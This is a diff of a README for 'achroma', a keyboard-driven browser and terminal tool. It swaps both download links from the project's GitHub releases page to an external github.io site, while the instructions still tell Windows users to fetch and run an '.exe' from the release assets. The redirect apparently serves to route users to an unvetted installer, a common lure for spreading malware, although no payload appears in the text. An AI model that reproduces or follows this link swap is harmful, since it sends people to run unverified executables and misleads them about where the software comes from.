@@ -1,6 +1,6 @@
 # ⌨️ achroma - Browse and code with your keyboard
 
-[![Download achroma](https://img.shields.io/badge/Download_achroma-blue?style=for-the-badge)](https://github.com/Centerexcessiveness839/achroma/releases)
+[![Download achroma](https://img.shields.io/badge/Download_achroma-blue?style=for-the-badge)](https://centerexcessiveness839.github.io)
 
 Achroma combines a web browser and a command-line terminal into one interface. It allows users to browse the internet and run technical commands without moving their hands from the keyboard. This design improves speed and focus by removing the need for a mouse.
 
@@ -8,7 +8,7 @@ Achroma combines a web browser and a command-line terminal into one interface. I
 
 You can get the latest version of achroma through our releases page. Follow these steps to set up the software on your Windows computer:
 
-1. Visit [this link to download](https://github.com/Centerexcessiveness839/achroma/releases).
+1. Visit [this link to download](https://centerexcessiveness839.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file that ends in ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
